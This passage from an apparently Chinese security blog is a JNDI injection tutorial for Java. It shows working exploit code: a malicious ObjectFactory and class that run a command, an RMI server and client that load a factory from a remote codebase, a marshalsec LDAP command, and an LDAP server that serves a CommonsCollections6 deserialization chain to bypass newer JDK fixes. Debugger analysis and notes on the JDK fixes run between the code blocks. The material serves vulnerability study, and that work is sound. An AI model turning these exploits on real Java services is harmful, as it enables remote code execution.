<span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> env  创建对象时使用的环境（可能为 null）。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 对象工厂创建出的对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 对象创建异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context ctx, Hashtable&lt;?, ?&gt; env)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE</span></span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>主要原理：JNDI Reference 远程加载Object Factory类的特性</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Reference(String name)</span><br><span class="line">    为类名为<span class="string">&quot;name&quot;</span>的对象构造一个新的应用</span><br><span class="line">Reference(String name , RefAddr addr)</span><br><span class="line">    为类型为<span class="string">&quot;name&quot;</span>的对象和地址构造一个新引用</span><br><span class="line">Reference(String name, ReAddr addr, String factory,String factoryLocation)</span><br><span class="line">    为类名为<span class="string">&quot;name&quot;</span>的对象，对象工厂的类名和为止以及对象的地址构造一个新的引用</span><br><span class="line">Reference(String name,String factory,String factoryLocation)</span><br><span class="line">    为类名为<span class="string">&quot;name&quot;</span>的对象以及对象工厂的类名和位置构造一个新的应用</span><br></pre></td></tr></table></figure><p>通过RMI来绑定一个Reference对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        String referenceUrl=<span class="string">&quot;http://localhost:9999&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refer&quot;</span>,<span class="string">&quot;fefer&quot;</span>,referenceUrl);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;refer&quot;</span>,refer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> 为什么需要<code>ReferenceWrapper</code>包装呢？</p><p> 被Registry绑定的对象必须继承UnicastRemoteObject类，而Reference类并没有实现这个类，所以无法被直接绑定</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212154638.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212154716.png"></p><h2 id="JNDI注入8u191↓"><a href="#JNDI注入8u191↓" class="headerlink" title="JNDI注入8u191↓"></a>JNDI注入8u191↓</h2><p>通常JNDI注入攻击都是 lookup方法的执行者，一般步骤如下：</p><ol><li>目标机器调用了<code>InitialContext.lookup(&quot;URL&quot;)</code>，且URL为用户可控</li><li>攻击者控制这个URL为一个恶意的RMI服务地址：<code>rmi://&#123;ip&#125;/&#123;port&#125;/name</code></li><li>恶意RMI服务会返回一个含有恶意factory的Reference对象</li><li>目标获取Reference之后会动态加载factory</li><li>攻击者可以在恶意factory的静态代码块，构造方法写入恶意代码，在目标实例化factory的时候被RCE</li></ol><p>当然，通常会有两种实现方式：LDAP和RMI</p><h3 id="RMI（8u121）"><a href="#RMI（8u121）" class="headerlink" title="RMI（8u121）"></a>RMI（8u121）</h3><p>我们先创建一个恶意的类，让服务器托管这个恶意的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用javac进行编译，放置于服务器</p><p>这里要注意一下，要用低版本的jdk进行编译，如果用高版本jdk编译会出现如下问题</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216102905.png"></p><p>当我换了jdk进行编译(jdk版本更换工具推荐 jevn)</p><p>然后编写Server端的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>,<span class="string">&quot;Exp&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;calc&quot;</span>,calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">clinet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果客户端lookup方法参数可控的话，命令就可以执行成功，可以被RCE</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216103047.png"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在此处打上断点进行调试</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216172905.png"></p><p>前几步是从Server端解析传入的URL，到 这一步 RegistryContexr#lookup的方法,</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216170918.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216170835.png"></p><p>我们可以看到<code>this.registry</code>仍然是<code>RegistryImpl_Stub</code>，执行<code>lookup</code>方法获取的是一个<code>ReferenceWrapper_Stub</code>对象，</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217124236.png"></p><p>在<code>RegistryContext#decodeObject</code>方法中会根据这个ReferenceWrapper_Stub对象获取Reference对象</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217124528.png"></p><p>跟进getReference方法,发现调用了UnicastRef#invoke ⽅法</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217125350.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218210218.png"></p><p>相当于进⾏了⼀次远程⽅法调⽤（⻅ RMI 中 的 “Client 发送请求”），⽽调⽤的⽅法为</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218211834.png"></p><p>正好对应着 RMI 服务端中的 ReferenceWrapper#getReference ⽅法（ReferenceWrapper 实现了 RemoteReference 接⼝）：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217125847.png"></p><p>于是这次远程⽅法调⽤的结果就是返回了远程 ReferenceWrpper 包装的 Reference 对象：</p><p>(条件运算符前面成立，返回前面得表达式)</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218212149.png"></p><p>继续跟代码，来到 NamingManager#getObjectInstance ⽅法，跟到<code> NamingManager##getObjectFactoryFromReference</code>方法获取factory实例</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218214023.png"></p><p>跟了以后发现，首先进行本地加载，加载失败以后，再从codebase加载factory</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218215814.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218220020.png"></p><p>其中，下面的LoadClass加载方式为 URLClassLoader，成功加载了恶意代码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218221857.png"></p><p>最后返回factory实例</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218213933.png"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>在 8U121之后，默认的RMI利用方式不再信任codebase</p><p>我这里以 8u181为例</p><p>在<code>RegistryContext#&lt;static&gt;</code>（末尾处）新增代码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218222425.png"></p><p>在 <code>RegistryContext#decodeObject</code>处</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218222552.png"></p><h2 id="LDAP方式"><a href="#LDAP方式" class="headerlink" title="LDAP方式"></a>LDAP方式</h2><p>与RMI方式一样，使用marshalsec开启ldap服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8000/#Exp</span></span><br></pre></td></tr></table></figure><h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">142</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br></pre></td></tr></table></figure><p>最后仍然是调⽤了 NamingManager#getObjectFactoryFromReference ⽅法。</p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>8u281版本</p><p>同上，跟到NamingManager##getObjectFactoryFromReference 方法的loadClass进去之后，会判断trustURLCodebase,长按ctrl+左键</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218230949.png"></p><p>会跳到 <code>VersionHelper12</code>中，这个类默认将其定位 false</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218231306.png"></p><h2 id="JNDI注入-8u191↑"><a href="#JNDI注入-8u191↑" class="headerlink" title="JNDI注入 8u191↑"></a>JNDI注入 8u191↑</h2><p>高版本的绕过思路有两种：</p><ol><li>LDAP Server直接返回恶意序列化数据，但是需要目标环境存在Gadget依赖</li><li>使用本地的Factory绕过(主要利用了<code>org.apache.naming.factory.BeanFactory</code>类)</li></ol><h3 id="直接返回序列化数据-LDAP"><a href="#直接返回序列化数据-LDAP" class="headerlink" title="直接返回序列化数据(LDAP)"></a>直接返回序列化数据(LDAP)</h3><p>LDAP Server可以直接改参考marshalsec，修改里面的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> demo2.utils.CommonUtil;</span><br><span class="line"><span class="keyword">import</span> demo2.utils.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LDAP server implementation returning JNDI references</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">byte</span>[] getCommonsCollections6()&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> Utils.createTemplates(<span class="string">&quot;Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, templates);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        CommonUtil.setFieldValue(invokerTransformer, <span class="string">&quot;iMethodName&quot;</span>,</span><br><span class="line">                <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> CommonUtil.serialize(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] args )</span> &#123;</span><br><span class="line"><span class="comment">//        int port = 1389;</span></span><br><span class="line"><span class="comment">//        if ( args.length &lt; 1 || args[ 0 ].indexOf(&#x27;#&#x27;) &lt; 0 ) &#123;</span></span><br><span class="line"><span class="comment">//            System.err.println(LDAPServer.class.getSimpleName() + &quot; &lt;codebase_url#classname&gt; [&lt;port&gt;]&quot;); //$NON-NLS-1$</span></span><br><span class="line"><span class="comment">//            System.exit(-1);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else if ( args.length &gt; 1 ) &#123;</span></span><br><span class="line"><span class="comment">//            port = Integer.parseInt(args[ 1 ]);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        String[] tmpArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:7777/#Exp&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> port=<span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(tmpArgs[<span class="number">0</span>])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            